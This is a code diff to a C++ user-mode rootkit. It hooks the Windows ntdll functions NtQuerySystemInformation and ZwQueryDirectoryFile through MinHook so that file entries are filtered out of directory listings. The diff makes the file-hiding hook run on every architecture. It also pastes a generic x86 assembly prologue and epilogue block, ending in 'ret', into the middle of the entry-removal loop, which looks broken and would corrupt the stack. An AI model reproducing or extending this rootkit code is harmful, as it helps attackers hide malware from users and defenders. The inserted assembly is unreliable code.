@@ -7,10 +7,7 @@ void Rootkit::Initialize()
 {
 	MH_Initialize();
 	MH_CreateHookApi(L"ntdll.dll", "NtQuerySystemInformation", HookedNtQuerySystemInformation, (PVOID*)&OriginalNtQuerySystemInformation);
-	if (sizeof(size_t) == 8) //TODO: Currently unstable on x86 processes!
-	{
-		MH_CreateHookApi(L"ntdll.dll", "ZwQueryDirectoryFile", HookedZwQueryDirectoryFile, (PVOID*)&OriginalZwQueryDirectoryFile);
-	}
+	MH_CreateHookApi(L"ntdll.dll", "ZwQueryDirectoryFile", HookedZwQueryDirectoryFile, (PVOID*)&OriginalZwQueryDirectoryFile);
 	MH_EnableHook(MH_ALL_HOOKS);
 }
 void Rootkit::DebugLog(wstring str)
@@ -65,6 +62,32 @@ NTSTATUS Rootkit::HookedZwQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PI
 					int delta = (ULONG)pCurrent - (ULONG)fileInformation;
 					int bytes = (DWORD)length - delta - GetFileNextEntryOffset(pCurrent, fileInformationClass);
 					RtlCopyMemory((PVOID)pCurrent, (PVOID)((char*)pCurrent + GetFileNextEntryOffset(pCurrent, fileInformationClass)), (DWORD)bytes);
+					_asm {
+						; Subroutine Prologue
+						  push ebp     ; Save the old base pointer value.
+						  mov ebp, esp ; Set the new base pointer value.
+						  sub esp, 4   ; Make room for one 4-byte local variable.
+						  push edi     ; Save the values of registers that the function
+						  push esi     ; will modify. This function uses EDI and ESI.
+						  
+							   ; Subroutine Body
+							  mov eax, [ebp+8]   ; Move value of parameter 1 into EAX
+							  mov esi, [ebp+12]  ; Move value of parameter 2 into ESI
+							  mov edi, [ebp+16]  ; Move value of parameter 3 into EDI
+
+							  mov [ebp-4], edi   ; Move EDI into the local variable
+							  add [ebp-4], esi   ; Add ESI into the local variable
+							  add eax, [ebp-4]   ; Add the contents of the local variable
+									     ; into EAX (final result)
+
+							  ; Subroutine Epilogue 
+							  pop esi      ; Recover register values
+							  pop  edi
+							  mov esp, ebp ; Deallocate local variables
+							  pop ebp ; Restore the caller's base pointer value
+							  ret
+					}
+					
 					continue;
 				}
 				else
